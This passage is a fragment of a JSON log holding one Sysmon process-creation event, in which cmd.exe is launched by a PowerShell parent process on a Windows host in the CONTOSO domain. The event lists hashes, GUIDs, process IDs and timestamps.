                "MD5": "8FAFBE3C23E2BE4D6A3C063118B9A4F2",
                "SHA256": "4C3EA4C44AAB74350355C419826B8C9E6172C3BD8F0BB5817ECF7BE50B629051"
            },
            "host": "cmp-535872",
            "hostname": "cmp-535872",
            "id": "2141ae44fe7a868c1bef1959ec3a4b2eb76b0a65e70de3707d7fba787a7c2f95",
            "image_path": "C:\\Windows\\SysWOW64\\cmd.exe",
            "integrity_level": "High",
            "log_name": "Microsoft-Windows-Sysmon/Operational",
            "logon_guid": "{E0425724-A193-46EB-8062-B64C378337CC}",
            "logon_id": "0xf28ca3",
            "nodetype": "event",
            "object": "process",
            "original_file_name": "Cmd.Exe",
            "parent_command_line": "\"c:\\windows\\syswow64\\windowspowershell\\v1.0\\powershell.exe\" -Version 5.1 -s -NoLogo -NoProfile",
            "parent_exe": "powershell.exe",
            "parent_image_path": "C:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe",
            "parent_process_guid": "{DD483508-E26C-5F6C-0000-0010E0300501}",
            "pid": 7056,
            "ppid": 3544,
            "process_guid": "{DD483508-E415-5F6C-0000-0010F6182201}",
            "record_number": "4096814",
            "subtype": "create",
            "terminal_session_id": "1",
            "time": "2020-09-24T18:23:17.157Z",
            "timestamp": 1600971797157,
            "user": "CONTOSO\\MCASEY",
            "uuid": "{DD483508-E415-5F6C-0000-0010F6182201}"
        },
